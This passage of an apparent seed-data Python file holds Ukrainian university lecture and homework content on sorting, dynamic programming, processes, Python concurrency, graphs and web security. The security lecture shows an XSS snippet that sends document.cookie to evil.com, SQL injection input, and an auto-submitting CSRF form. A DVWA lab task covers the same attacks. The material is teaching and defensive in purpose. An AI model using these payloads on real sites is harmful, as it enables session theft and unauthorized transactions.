<p>Вибираємо <strong>pivot</strong>, переміщуємо менші елементи ліворуч, більші — праворуч, рекурсивно сортуємо підмасиви.</p>
<pre class="ql-syntax" spellcheck="false">def quick_sort(arr, lo=0, hi=None):
    if hi is None:
        hi = len(arr) - 1
    if lo < hi:
        p = partition(arr, lo, hi)
        quick_sort(arr, lo, p - 1)
        quick_sort(arr, p + 1, hi)

def partition(arr, lo, hi):
    pivot = arr[hi]  # останній елемент як pivot
    i = lo - 1
    for j in range(lo, hi):
        if arr[j] <= pivot:
            i += 1
            arr[i], arr[j] = arr[j], arr[i]
    arr[i+1], arr[hi] = arr[hi], arr[i+1]
    return i + 1</pre>
<p><strong>Середній випадок:</strong> O(n log n).<br>
<strong>Найгірший випадок:</strong> O(n²) — якщо pivot завжди мінімальний/максимальний.<br>
<strong>Пам'ять:</strong> O(log n) (стек рекурсії).<br>
<strong>Стабільний:</strong> ні. <strong>Рішення:</strong> randomized quicksort (випадковий pivot).</p>

<h3>4. Heap Sort (Пірамідальне сортування)</h3>
<p>Будуємо max-купу з масиву, потім почергово виймаємо максимум та відновлюємо купу.</p>
<pre class="ql-syntax" spellcheck="false">def heap_sort(arr):
    n = len(arr)
    # Будуємо max-купу
    for i in range(n // 2 - 1, -1, -1):
        heapify(arr, n, i)
    # Виймаємо елементи один за одним
    for i in range(n - 1, 0, -1):
        arr[0], arr[i] = arr[i], arr[0]
        heapify(arr, i, 0)

def heapify(arr, n, i):
    largest = i
    l, r = 2*i + 1, 2*i + 2
    if l < n and arr[l] > arr[largest]: largest = l
    if r < n and arr[r] > arr[largest]: largest = r
    if largest != i:
        arr[i], arr[largest] = arr[largest], arr[i]
        heapify(arr, n, largest)</pre>
<p><strong>Складність:</strong> O(n log n) у всіх випадках.<br>
<strong>Пам'ять:</strong> O(1) — сортується in-place.<br>
<strong>Стабільний:</strong> ні.</p>

<h3>5. Порівняння алгоритмів</h3>
<ul>
<li><strong>Merge Sort</strong> — найнадійніший, стабільний, але витрачає пам'ять</li>
<li><strong>Quick Sort</strong> — найшвидший на практиці (константа менша), але нестабільний та може деградувати</li>
<li><strong>Heap Sort</strong> — гарантовано O(n log n), in-place, але повільніший за quick sort на практиці</li>
</ul>
<blockquote>Python: sorted() та list.sort() використовують Timsort — гібрид merge sort + insertion sort, O(n log n), стабільний.</blockquote>""",
        """<h2>Динамічне програмування</h2>
<h3>1. Ідея динамічного програмування</h3>
<p><strong>Динамічне програмування (ДП)</strong> — метод розв'язання задач шляхом розбиття їх на підзадачі, збереження результатів (мемоізація/таблиця), щоб не обчислювати їх повторно.</p>
<p>Умови застосування ДП:</p>
<ul>
<li><strong>Оптимальна підструктура</strong> — оптимальний розв'язок задачі містить оптимальні розв'язки підзадач</li>
<li><strong>Підзадачі, що перекриваються</strong> — одні й ті самі підзадачі зустрічаються багаторазово</li>
</ul>

<h3>2. Підходи: top-down vs bottom-up</h3>
<p><strong>Top-down (мемоізація):</strong> рекурсія + кеш</p>
<pre class="ql-syntax" spellcheck="false">from functools import lru_cache

@lru_cache(maxsize=None)
def fib(n):
    if n <= 1: return n
    return fib(n-1) + fib(n-2)</pre>
<p><strong>Bottom-up (табуляція):</strong> ітеративно заповнюємо таблицю</p>
<pre class="ql-syntax" spellcheck="false">def fib(n):
    dp = [0] * (n + 1)
    dp[1] = 1
    for i in range(2, n + 1):
        dp[i] = dp[i-1] + dp[i-2]
    return dp[n]</pre>

<h3>3. Задача про рюкзак (0/1 Knapsack)</h3>
<p>Дано: n предметів з вагами w[i] та цінностями v[i], рюкзак ємністю W. Максимізувати цінність.</p>
<pre class="ql-syntax" spellcheck="false">def knapsack(weights, values, W):
    n = len(weights)
    dp = [[0] * (W + 1) for _ in range(n + 1)]

    for i in range(1, n + 1):
        for w in range(W + 1):
            # Не беремо предмет i
            dp[i][w] = dp[i-1][w]
            # Беремо предмет i (якщо влазить)
            if weights[i-1] <= w:
                dp[i][w] = max(dp[i][w],
                               dp[i-1][w - weights[i-1]] + values[i-1])

    return dp[n][W]</pre>
<p><strong>Складність:</strong> O(n·W) по часу та пам'яті.</p>

<h3>4. Найбільша спільна підпослідовність (LCS)</h3>
<pre class="ql-syntax" spellcheck="false">def lcs(s1, s2):
    m, n = len(s1), len(s2)
    dp = [[0] * (n + 1) for _ in range(m + 1)]

    for i in range(1, m + 1):
        for j in range(1, n + 1):
            if s1[i-1] == s2[j-1]:
                dp[i][j] = dp[i-1][j-1] + 1
            else:
                dp[i][j] = max(dp[i-1][j], dp[i][j-1])

    return dp[m][n]

print(lcs("ABCBDAB", "BDCABA"))  # 4</pre>

<h3>5. Відстань редагування (Edit Distance / Levenshtein)</h3>
<p>Мінімальна кількість операцій (вставка, видалення, заміна) для перетворення рядка S1 у S2.</p>
<pre class="ql-syntax" spellcheck="false">def edit_distance(s1, s2):
    m, n = len(s1), len(s2)
    dp = [[0]*(n+1) for _ in range(m+1)]
    for i in range(m+1): dp[i][0] = i
    for j in range(n+1): dp[0][j] = j

    for i in range(1, m+1):
        for j in range(1, n+1):
            if s1[i-1] == s2[j-1]:
                dp[i][j] = dp[i-1][j-1]
            else:
                dp[i][j] = 1 + min(dp[i-1][j], dp[i][j-1], dp[i-1][j-1])
    return dp[m][n]</pre>""",
    ],
    # ── Операційні системи ──────────────────────────────────────────────────
    "Операційні системи": [
        """<h2>Управління процесами та потоками</h2>
<h3>1. Процес vs Потік</h3>
<p><strong>Процес</strong> — екземпляр програми, що виконується. Має власний адресний простір, файлові дескриптори, стек.</p>
<p><strong>Потік (thread)</strong> — найменша одиниця виконання всередині процесу. Потоки одного процесу <em>поділяють</em> адресний простір, але мають власні стеки та лічильники команд.</p>

<table>
<thead><tr><th>Характеристика</th><th>Процес</th><th>Потік</th></tr></thead>
<tbody>
<tr><td>Адресний простір</td><td>Власний</td><td>Спільний (у межах процесу)</td></tr>
<tr><td>Створення</td><td>fork() — повільно</td><td>pthread_create() — швидко</td></tr>
<tr><td>Комунікація</td><td>IPC (pipe, socket)</td><td>Спільна пам'ять</td></tr>
<tr><td>Захист</td><td>Ізольований</td><td>Помилка в потоці — збій процесу</td></tr>
</tbody>
</table>

<h3>2. Стан процесу</h3>
<p>Процес може перебувати в одному зі станів:</p>
<ul>
<li><strong>New</strong> — щойно створений</li>
<li><strong>Ready</strong> — чекає на CPU</li>
<li><strong>Running</strong> — виконується на CPU</li>
<li><strong>Waiting/Blocked</strong> — чекає на I/O або подію</li>
<li><strong>Terminated</strong> — завершив роботу</li>
</ul>

<h3>3. Системні виклики для роботи з процесами (Linux)</h3>
<pre class="ql-syntax" spellcheck="false">#include &lt;unistd.h&gt;
#include &lt;sys/wait.h&gt;

pid_t pid = fork();

if (pid == 0) {
    // Дочірній процес
    execl("/bin/ls", "ls", "-la", NULL);
    // exec замінює образ процесу
} else if (pid > 0) {
    // Батьківський процес
    int status;
    waitpid(pid, &status, 0);
    printf("Дочірній процес завершився з кодом %d\n",
           WEXITSTATUS(status));
} else {
    perror("fork failed");
}</pre>

<h3>4. POSIX Threads (pthreads)</h3>
<pre class="ql-syntax" spellcheck="false">#include &lt;pthread.h&gt;

void* worker(void* arg) {
    int id = *(int*)arg;
    printf("Потік %d виконується\n", id);
    return NULL;
}

int main() {
    pthread_t threads[4];
    int ids[4] = {1, 2, 3, 4};

    for (int i = 0; i < 4; i++) {
        pthread_create(&threads[i], NULL, worker, &ids[i]);
    }
    for (int i = 0; i < 4; i++) {
        pthread_join(threads[i], NULL);  // чекаємо завершення
    }
    return 0;
}</pre>

<h3>5. Планування процесів</h3>
<p><strong>Алгоритми планування CPU:</strong></p>
<ul>
<li><strong>FCFS (First Come First Served)</strong> — черга, немає витіснення; convoy effect при довгих процесах</li>
<li><strong>SJF (Shortest Job First)</strong> — мінімальний час очікування, але може морити голодом довгі процеси</li>
<li><strong>Round Robin</strong> — кожен процес отримує квант часу (10-100 мс); хороший для інтерактивних систем</li>
<li><strong>Priority Scheduling</strong> — пріоритети; ризик starvation → aging (поступове підвищення пріоритету)</li>
<li><strong>CFS (Completely Fair Scheduler)</strong> — алгоритм Linux, на основі червоно-чорного дерева</li>
</ul>""",
    ],
    # ── Python ──────────────────────────────────────────────────────────────
    "Програмування мовою Python": [
        """<h2>Декоратори та генератори в Python</h2>
<h3>1. Функції як об'єкти першого класу</h3>
<p>У Python функції є звичайними об'єктами: їх можна передавати як аргументи, повертати з функцій, зберігати в змінних.</p>
<pre class="ql-syntax" spellcheck="false">def greet(name):
    return f"Привіт, {name}!"

say_hello = greet        # присвоєння
print(say_hello("Олена"))  # Привіт, Олена!

def apply(func, value):  # функція вищого порядку
    return func(value)

print(apply(str.upper, "world"))  # WORLD</pre>

<h3>2. Замикання (Closure)</h3>
<p>Внутрішня функція, що «захоплює» змінні зовнішньої функції навіть після її завершення.</p>
<pre class="ql-syntax" spellcheck="false">def make_multiplier(factor):
    def multiply(x):
        return x * factor  # захоплює factor
    return multiply

double = make_multiplier(2)
triple = make_multiplier(3)
print(double(5))   # 10
print(triple(5))   # 15</pre>

<h3>3. Декоратори</h3>
<p>Декоратор — функція, що приймає функцію та повертає нову функцію (зазвичай обгортку).</p>
<pre class="ql-syntax" spellcheck="false">import functools
import time

def timer(func):
    @functools.wraps(func)  # зберігає __name__, __doc__
    def wrapper(*args, **kwargs):
        start = time.perf_counter()
        result = func(*args, **kwargs)
        elapsed = time.perf_counter() - start
        print(f"{func.__name__} виконувалась {elapsed:.4f}с")
        return result
    return wrapper

@timer
def heavy_computation(n):
    return sum(i**2 for i in range(n))

heavy_computation(10**6)  # heavy_computation виконувалась 0.1234с</pre>

<p><strong>Декоратор з параметрами:</strong></p>
<pre class="ql-syntax" spellcheck="false">def retry(times=3, exceptions=(Exception,)):
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(times):
                try:
                    return func(*args, **kwargs)
                except exceptions as e:
                    if attempt == times - 1:
                        raise
                    print(f"Спроба {attempt+1} невдала: {e}")
        return wrapper
    return decorator

@retry(times=3, exceptions=(ConnectionError,))
def fetch_data(url):
    ...  # може кидати ConnectionError</pre>

<h3>4. Генератори</h3>
<p>Генератор — функція з <strong>yield</strong>. Повертає ітератор, що обчислює значення ліниво (по одному).</p>
<pre class="ql-syntax" spellcheck="false">def fibonacci():
    a, b = 0, 1
    while True:
        yield a
        a, b = b, a + b

fib = fibonacci()
print([next(fib) for _ in range(8)])  # [0, 1, 1, 2, 3, 5, 8, 13]

# Генераторний вираз (аналог list comprehension, але ледачий)
squares = (x**2 for x in range(10**9))  # не витрачає пам'ять!
print(next(squares))  # 0</pre>

<p><strong>yield from — делегування підгенератору:</strong></p>
<pre class="ql-syntax" spellcheck="false">def chain(*iterables):
    for it in iterables:
        yield from it

list(chain([1,2], [3,4], [5]))  # [1, 2, 3, 4, 5]</pre>

<h3>5. contextlib та протокол контекстного менеджера</h3>
<pre class="ql-syntax" spellcheck="false">from contextlib import contextmanager

@contextmanager
def managed_resource(name):
    print(f"Відкриваємо {name}")
    try:
        yield name.upper()
    finally:
        print(f"Закриваємо {name}")

with managed_resource("база даних") as res:
    print(f"Працюємо з {res}")</pre>""",
        """<h2>Паралельне програмування: threading, multiprocessing, asyncio</h2>
<h3>1. GIL та обмеження threading</h3>
<p><strong>GIL (Global Interpreter Lock)</strong> — м'ютекс CPython, що дозволяє одночасно виконуватись лише одному потоку Python.</p>
<p><strong>Наслідки:</strong></p>
<ul>
<li>Threading корисний для <strong>I/O-bound</strong> задач (мережа, диски): поки один потік чекає I/O, GIL вивільняється</li>
<li>Threading <strong>не дає приросту</strong> для CPU-bound задач (обчислення)</li>
<li>Для CPU-bound → <strong>multiprocessing</strong> (окремі процеси, кожен має власний GIL)</li>
</ul>

<h3>2. threading</h3>
<pre class="ql-syntax" spellcheck="false">import threading
import requests

def download(url, results, idx):
    response = requests.get(url, timeout=5)
    results[idx] = len(response.content)

urls = ["https://example.com"] * 5
results = [0] * len(urls)

threads = [
    threading.Thread(target=download, args=(url, results, i))
    for i, url in enumerate(urls)
]

for t in threads: t.start()
for t in threads: t.join()

print(f"Загальний обсяг: {sum(results)} байт")</pre>

<h3>3. multiprocessing</h3>
<pre class="ql-syntax" spellcheck="false">from multiprocessing import Pool
import os

def cpu_task(n):
    # CPU-bound: обчислюємо суму квадратів
    return sum(i**2 for i in range(n))

if __name__ == "__main__":
    data = [10**6] * os.cpu_count()

    with Pool(processes=os.cpu_count()) as pool:
        results = pool.map(cpu_task, data)

    print(f"Результати: {results}")</pre>

<h3>4. asyncio</h3>
<p>Кооперативна багатозадачність: один потік, але задачі добровільно передають контроль через <strong>await</strong>.</p>
<pre class="ql-syntax" spellcheck="false">import asyncio
import aiohttp

async def fetch(session, url):
    async with session.get(url) as response:
        return await response.text()

async def main():
    urls = [f"https://httpbin.org/delay/1"] * 5

    async with aiohttp.ClientSession() as session:
        # Всі запити паралельно (не послідовно!)
        tasks = [fetch(session, url) for url in urls]
        results = await asyncio.gather(*tasks)

    print(f"Отримано {len(results)} відповідей")

# Python 3.7+
asyncio.run(main())</pre>

<h3>5. Коли що використовувати</h3>
<ul>
<li><strong>asyncio</strong> — багато одночасних I/O-операцій (веб-сервер, чат, парсинг сотень URL)</li>
<li><strong>threading</strong> — помірна кількість I/O-задач, або інтеграція зі старим синхронним кодом</li>
<li><strong>multiprocessing</strong> — важкі обчислення (ML, обробка зображень, наукові розрахунки)</li>
</ul>
<pre class="ql-syntax" spellcheck="false">from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

# Зручний інтерфейс для обох
with ThreadPoolExecutor(max_workers=4) as executor:
    futures = [executor.submit(some_io_task, arg) for arg in args]
    results = [f.result() for f in futures]</pre>""",
    ],
    # ── Безпека інформаційних систем ────────────────────────────────────────
    "Безпека інформаційних систем": [
        """<h2>Атаки на веб-додатки: XSS, SQL Injection, CSRF</h2>
<h3>1. SQL Injection</h3>
<p>Атаки, при яких зловмисник впроваджує шкідливий SQL-код у запит до бази даних.</p>
<p><strong>Вразливий код:</strong></p>
<pre class="ql-syntax" spellcheck="false"># ❌ Небезпечно — конкатенація рядків
username = request.GET['username']
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)

# Зловмисник вводить: admin' OR '1'='1
# Запит стає: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
# → повертає всіх користувачів!</pre>
<p><strong>Захист — параметризовані запити:</strong></p>
<pre class="ql-syntax" spellcheck="false"># ✅ Безпечно — параметризований запит
cursor.execute("SELECT * FROM users WHERE username = %s", [username])

# Django ORM (автоматично безпечний)
User.objects.filter(username=username)</pre>
<p><strong>Інші типи SQL Injection:</strong></p>
<ul>
<li><strong>Blind SQL Injection</strong> — відповідь лише "true/false", але можна витягнути дані побіт</li>
<li><strong>Time-based</strong> — SLEEP() для перевірки умов</li>
<li><strong>Out-of-band</strong> — через DNS/HTTP запити з сервера</li>
</ul>

<h3>2. Cross-Site Scripting (XSS)</h3>
<p>Впровадження шкідливого JavaScript у сторінку, що виконається у браузері жертви.</p>
<p><strong>Stored XSS</strong> — скрипт зберігається в БД і відображається іншим:</p>
<pre class="ql-syntax" spellcheck="false">&lt;!-- Зловмисник вводить у поле коментаря: --&gt;
&lt;script&gt;
  fetch('https://evil.com/steal?cookie=' + document.cookie);
&lt;/script&gt;</pre>
<p><strong>Reflected XSS</strong> — скрипт у URL, жертва переходить за посиланням:<br>
<code>https://site.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<p><strong>Захист:</strong></p>
<ul>
<li>Екранування виведення: &amp; → &amp;amp;, &lt; → &amp;lt;, &gt; → &amp;gt;</li>
<li>Content Security Policy (CSP): заборона inline-скриптів</li>
<li>HttpOnly cookies: JavaScript не може читати cookie</li>
<li>Django: шаблони автоматично екранують, <code>{% autoescape off %}</code> — небезпечно!</li>
</ul>

<h3>3. CSRF (Cross-Site Request Forgery)</h3>
<p>Зловмисний сайт змушує браузер жертви зробити запит до іншого сайту від її імені.</p>
<pre class="ql-syntax" spellcheck="false">&lt;!-- На evil.com --&gt;
&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=10000"&gt;
&lt;!-- Або форма, що авто-відправляється --&gt;
&lt;form action="https://bank.com/transfer" method="POST"&gt;
  &lt;input name="amount" value="10000"&gt;
  &lt;input name="to" value="attacker_account"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</pre>
<p><strong>Захист — CSRF-токен:</strong></p>
<pre class="ql-syntax" spellcheck="false">{# Django шаблон — обов'язково для POST-форм #}
&lt;form method="post"&gt;
    {% csrf_token %}
    ...
&lt;/form&gt;

# Django автоматично перевіряє токен для всіх POST-запитів
# Для AJAX: передавати X-CSRFToken у заголовку</pre>

<h3>4. OWASP Top 10 — огляд</h3>
<ol>
<li>Broken Access Control</li>
<li>Cryptographic Failures</li>
<li><strong>Injection (SQL, NoSQL, OS)</strong></li>
<li>Insecure Design</li>
<li>Security Misconfiguration</li>
<li>Vulnerable Components</li>
<li>Authentication Failures</li>
<li>Data Integrity Failures</li>
<li>Security Logging Failures</li>
<li>SSRF</li>
</ol>
<blockquote>Практика: PortSwigger Web Security Academy — безкоштовні лабораторні роботи по кожній атаці: https://portswigger.net/web-security</blockquote>""",
    ],
    # ── Дискретна математика ─────────────────────────────────────────────────
    "Дискретна математика": [
        """<h2>Теорія графів. Основні поняття та задачі</h2>
<h3>1. Визначення та термінологія</h3>
<p><strong>Граф G = (V, E)</strong> — множина вершин V та множина ребер E ⊆ V×V.</p>
<ul>
<li><strong>Орієнтований (digraph)</strong> — ребра мають напрямок (дуги)</li>
<li><strong>Неорієнтований</strong> — ребра симетричні</li>
<li><strong>Зважений</strong> — кожному ребру приписана вага</li>
<li><strong>Ступінь вершини deg(v)</strong> — кількість ребер, інцидентних v</li>
<li><strong>Шлях</strong> — послідовність вершин, де кожна пара сусідніх з'єднана ребром</li>
<li><strong>Цикл</strong> — шлях, що повертається у початкову вершину</li>
<li><strong>Зв'язний граф</strong> — між будь-якими двома вершинами є шлях</li>
</ul>

<h3>2. Подання графів</h3>
<p><strong>Матриця суміжності A[i][j]</strong> — 1, якщо є ребро (i,j), інакше 0.</p>
<ul><li>Перевага: O(1) перевірка ребра. Недолік: O(V²) пам'ять</li></ul>
<p><strong>Список суміжності</strong> — для кожної вершини — список сусідів.</p>
<ul><li>Перевага: O(V+E) пам'ять. Недолік: O(deg(v)) перевірка ребра</li></ul>
<pre class="ql-syntax" spellcheck="false"># Список суміжності в Python
graph = {
    'A': ['B', 'C'],
    'B': ['A', 'D', 'E'],
    'C': ['A', 'F'],
    'D': ['B'],
    'E': ['B', 'F'],
    'F': ['C', 'E']
}</pre>

<h3>3. Обхід графу: BFS та DFS</h3>
<p><strong>BFS (обхід у ширину)</strong> — використовує чергу, знаходить найкоротший шлях (незважений граф):</p>
<pre class="ql-syntax" spellcheck="false">from collections import deque

def bfs(graph, start):
    visited = set()
    queue = deque([start])
    order = []

    while queue:
        node = queue.popleft()
        if node not in visited:
            visited.add(node)
            order.append(node)
            queue.extend(n for n in graph[node] if n not in visited)

    return order</pre>
<p><strong>DFS (обхід у глибину)</strong> — використовує стек (або рекурсію):</p>
<pre class="ql-syntax" spellcheck="false">def dfs(graph, node, visited=None):
    if visited is None:
        visited = set()
    visited.add(node)
    for neighbor in graph[node]:
        if neighbor not in visited:
            dfs(graph, neighbor, visited)
    return visited</pre>

<h3>4. Топологічне сортування (DAG)</h3>
<p>Для орієнтованого ациклічного графа (DAG) — упорядкування вершин так, щоб усі дуги йшли зліва направо.</p>
<p><strong>Застосування:</strong> залежності пакетів, порядок компіляції, планування задач.</p>
<pre class="ql-syntax" spellcheck="false">def topological_sort(graph):
    in_degree = {v: 0 for v in graph}
    for v in graph:
        for u in graph[v]:
            in_degree[u] += 1

    queue = deque([v for v in graph if in_degree[v] == 0])
    result = []

    while queue:
        node = queue.popleft()
        result.append(node)
        for neighbor in graph[node]:
            in_degree[neighbor] -= 1
            if in_degree[neighbor] == 0:
                queue.append(neighbor)

    return result if len(result) == len(graph) else []  # [] якщо цикл</pre>

<h3>5. Мінімальне кістякове дерево</h3>
<p>Для зваженого зв'язного графа — дерево, що з'єднує всі вершини з мінімальною сумою ваг ребер.</p>
<p><strong>Алгоритм Крускала:</strong> сортуємо ребра за вагою, додаємо в дерево якщо не утворюють цикл (Union-Find).</p>
<p><strong>Алгоритм Прима:</strong> починаємо з довільної вершини, жадібно додаємо найдешевше ребро до вже побудованого дерева.</p>""",
    ],
}

DEFAULT_LECTURE_HTML = [
    """<h2>Теоретичні основи розділу</h2>
<h3>1. Вступ до теми</h3>
<p>На цьому занятті ми розглянули ключові поняття та теоретичні основи поточного розділу дисципліни. Матеріал формує базу для подальшого практичного застосування.</p>
<h3>2. Основні визначення</h3>
<p>Упродовж лекції були введені основні терміни та визначення. Рекомендується занотувати їх у конспект та підкріпити прикладами зі слайдів.</p>
<h3>3. Зв'язок з попередніми темами</h3>
<p>Новий матеріал тісно пов'язаний із темами попередніх занять. Перед вивченням рекомендується повторити відповідні розділи підручника.</p>
<h3>4. Практичне значення</h3>
<p>Знання, отримані на цьому занятті, використовуються при розв'язанні практичних завдань, лабораторних робіт та є базою для підсумкового контролю.</p>
<blockquote>Повний конспект лекції доступний у Teams у розділі «Матеріали». Презентацію завантажено у Moodle.</blockquote>""",
]

# ─────────────────────────────────────────────────────────────────────────────
# Домашні завдання — розгорнуті
# ─────────────────────────────────────────────────────────────────────────────

HOMEWORK_RICH = {
    "Вища математика": [
        """Опрацювати конспект лекції та параграфи підручника (Кузьменко І.М.) відповідно до теми заняття.

Завдання для самостійної роботи:
1. Обчислити визначений інтеграл ∫₀³ (2x² − 5x + 3) dx, перевірити відповідь формулою Ньютона–Лейбніца.
2. Знайти площу фігури, обмеженої параболою y = x² − 4 та прямою y = 0 (де y ≥ 0).
3. Скласти та розв'язати задачу Коші для диференціального рівняння y' = 2xy при y(0) = 1.

Підготуватися до усного опитування за ключовими визначеннями та теоремами теми.
Записати питання, що виникли під час самостійного вивчення — розберемо на наступній лекції.""",
        """Завдання до наступного практичного заняття:

Варіант задається за списком у Teams (непарний/парний номер залікової книжки).

Задача 1 (обов'язкова): Обчислити інтеграл, застосувавши метод підстановки або інтегрування частинами — за вказівкою варіанту.

Задача 2 (обов'язкова): Розв'язати диференціальне рівняння першого порядку методом розділення змінних або методом варіації сталої.

Задача 3 (на оцінку +1 бал): Дослідити збіжність невласного інтеграла.

Оформлення: розв'язок у зошиті, з повним записом усіх проміжних кроків.
Здати: на початку наступного практичного заняття.""",
    ],
    "Об'єктно-орієнтоване програмування": [
        """Реалізувати один із патернів проектування з лекції (на вибір: Singleton, Factory або Observer) у вигляді окремого класу / ієрархії класів.

Вимоги:
— Мова: Java або Python (за домовленістю з викладачем)
— Код з коментарями, що пояснюють роль кожного класу
— Продемонструвати роботу патерну через unit-тест або main-метод
— README.md з коротким описом реалізованого патерну та UML-діаграмою (клас-діаграма)

Здати через GitHub Classroom (посилання у Teams) до кінця тижня.
На наступній практичній роботі — 5-хвилинне усне пояснення свого рішення.""",
        """Самостійна робота: SOLID на практиці.

Завдання:
1. Знайти у наведеному коді (файл bad_code.java у Teams › ООП › ДЗ) порушення принципів SOLID.
2. Для кожного порушення: назвати принцип, пояснити проблему, запропонувати виправлення.
3. Написати рефакторений код, що дотримується SOLID.

Оформлення: документ PDF або MD з поясненнями та кодом.
Критерії оцінювання: знайдено ≥ 4 порушень, кожне обґрунтовано, рефакторинг коректний.""",
    ],
    "Бази даних": [
        """Практичне завдання: SQL-запити до навчальної бази даних.

База даних «Університет» доступна у Teams › БД › Завдання (SQL-дамп для імпорту).

Написати SQL-запити для виконання наступних завдань:
1. Знайти студентів, які здали всі заліки (використати NOT EXISTS або GROUP BY / HAVING).
2. Вивести рейтинг студентів по кожній групі (використати вікнові функції RANK() або DENSE_RANK()).
3. Знайти предмети, середній бал з яких нижче загального середнього балу (підзапит).
4. (Бонус) Написати рекурсивний CTE для відображення ієрархії посад викладачів.

Здати: файл .sql з запитами + скріншоти результатів виконання.
Дедлайн: до початку наступного лабораторного заняття.""",
        """Лабораторна робота №3: Транзакції та рівні ізоляції.

Завдання:
1. Створити дві сесії до тестової БД (можна у двох терміналах psql або DBeaver).
2. Відтворити сценарій «брудного читання»: у сесії A почати транзакцію і змінити дані без COMMIT; у сесії B прочитати ті ж дані при READ UNCOMMITTED.
3. Продемонструвати роботу SERIALIZABLE ізоляції при паралельному оновленні одного рядка.
4. Навмисно створити deadlock та зафіксувати повідомлення про помилку.

Звіт: скріншоти кожного сценарію + пояснення результатів.
Захист на наступному занятті: знати відповіді на теоретичні питання про ACID.""",
    ],
    "Веб-технології": [
        """Практична робота: розробка REST API на Django.

Завдання:
Реалізувати API для простого ToDo-сервісу:
— GET /api/tasks/ — список всіх завдань
— POST /api/tasks/ — створити завдання
— GET /api/tasks/{id}/ — отримати одне завдання
— PATCH /api/tasks/{id}/ — оновити статус (done: true/false)
— DELETE /api/tasks/{id}/ — видалити завдання

Вимоги:
— Django REST Framework (Django + serializers + ViewSet)
— Автентифікація через JWT (djangorestframework-simplejwt)
— Покриття тестами (pytest-django): ≥ 5 тестів
— Документація ендпоінтів у README

Здати через GitHub Classroom. Дедлайн — п'ятниця 23:59.""",
        """Самостійне завдання: JavaScript async/await.

Написати невеликий SPA (Single Page Application), що:
1. Завантажує список елементів через fetch() з публічного API (наприклад, jsonplaceholder.typicode.com)
2. Відображає елементи у вигляді карток на сторінці (pure JS або мінімальний фреймворк)
3. Реалізує пошук/фільтрацію без перезавантаження сторінки
4. Обробляє помилки мережі та показує користувачу зрозуміле повідомлення

Технології: HTML + CSS + Vanilla JS (ES2022+), без jQuery.
Обов'язково: async/await, try/catch, AbortController для скасування запитів.""",
    ],
    "Алгоритми та структури даних": [
        """Практичне завдання: реалізація алгоритмів сортування.

Реалізувати на Python:
1. Merge Sort — рекурсивна версія
2. Quick Sort — з випадковим вибором pivot (randomized)
3. Heap Sort — in-place

Для кожного алгоритму:
— Перевірити на масивах розміром 100, 1000, 10 000, 100 000 елементів (випадкові + майже відсортовані + обернено відсортовані)
— Виміряти час виконання (time.perf_counter)
— Побудувати графік залежності часу від розміру (matplotlib або Google Colab)

Здати: Jupyter notebook (.ipynb) з кодом, тестами та графіками.
Дедлайн: до наступної лекції.""",
        """Домашнє завдання: динамічне програмування.

Задача 1 (обов'язкова):
Реалізувати задачу «Найдовша зростаюча підпослідовність» (LIS) двома способами:
— O(n²) через ДП
— O(n log n) через бінарний пошук
Порівняти час виконання.

Задача 2 (обов'язкова):
Задача про розбиття монети: дано номінали монет та сума S, знайти мінімальну кількість монет для її набору (coin change problem).

Задача 3 (бонус +2 бали):
Реалізувати алгоритм Хірше для задачі LCS з O(n) пам'яттю замість O(n·m).

Всі задачі перевіряються на системі judge (посилання у Teams).""",
    ],
    "Операційні системи": [
        """Лабораторна робота №4: Управління процесами в Linux.

Виконати у Linux-середовищі (або WSL на Windows):

Завдання 1: Написати C-програму, що:
— Створює 3 дочірніх процеси через fork()
— Кожен дочірній процес виводить свій PID та PID батька
— Батьківський процес чекає завершення всіх дочірніх через waitpid()

Завдання 2: Написати програму з двома потоками (pthreads), що:
— Спільно збільшують лічильник до 1 000 000
— Спочатку без синхронізації (показати race condition)
— Потім з м'ютексом (коректний результат)

Завдання 3: Порівняти продуктивність fork() та pthread_create() (10 000 разів кожен), виміряти час.

Звіт: код + результати + висновки. Захист — усно.""",
    ],
    "Програмування мовою Python": [
        """Практична робота: декоратори та генератори.

Реалізувати:
1. Декоратор @cache — мемоізація з LRU-стратегією (без використання functools.lru_cache)
2. Декоратор @rate_limit(calls=5, period=60) — обмеження кількості викликів функції за проміжок часу
3. Генератор tree_walk(path) — обхід директорії у глибину, yield кожного файлу

Бонус: декоратор @retry(times=3, delay=1, exceptions=(ConnectionError,)) для автоматичного повтору при помилці.

Для кожного — написати тести (pytest).
Здати через GitHub Classroom.""",
        """Домашня робота: asyncio та aiohttp.

Написати асинхронний веб-скрапер:
— Приймає список URL (з файлу або args)
— Завантажує сторінки паралельно (asyncio.gather або asyncio.Semaphore для обмеження конкурентних запитів)
— Рахує кількість слів на кожній сторінці
— Зберігає результати у CSV

Вимоги:
— Обмежити конкурентність до 10 паралельних запитів (asyncio.Semaphore)
— Обробити HTTP-помилки та таймаути
— Логування прогресу (tqdm або просте виведення)
— Тести з використанням aioresponses (mock HTTP)""",
    ],
    "Безпека інформаційних систем": [
        """Лабораторна робота: аналіз вразливостей веб-додатку.

Середовище: DVWA (Damn Vulnerable Web Application) — встановити через Docker:
docker run -p 80:80 vulnerables/web-dvwa

Завдання:
1. SQL Injection: Витягнути список користувачів через вразливий пошуковий рядок. Використати ручний ввід та SQLMap (для демонстрації автоматизації).
2. Stored XSS: Впровадити payload, що виводить alert() і викрадає document.cookie.
3. CSRF: Створити HTML-сторінку, що змінює пароль адміністратора без його відома.
4. Для кожної атаки — продемонструвати захист: параметризовані запити, CSP, CSRF-токен.

Важливо: виконувати ЛИШЕ у ізольованому середовищі (Docker/VM). Жодних реальних цілей!
Звіт: скріншоти атак + скріншоти захисту + пояснення.""",
    ],
}

DEFAULT_HOMEWORK = [
    """Опрацювати конспект лекції та відповідний розділ підручника.

Завдання:
1. Виписати ключові визначення та теореми теми у зошит.
2. Розв'язати задачі зі слайдів (без зірочки — обов'язкові, із зірочкою — за бажанням).
3. Підготувати 2-3 запитання до наступного заняття.

Підготуватися до усного опитування за пройденим матеріалом.""",
    """Самостійне опрацювання матеріалу заняття.

1. Переглянути презентацію з Teams, доповнити конспект прикладами з лекції.
2. Опрацювати рекомендовані розділи підручника (вказано на останньому слайді).
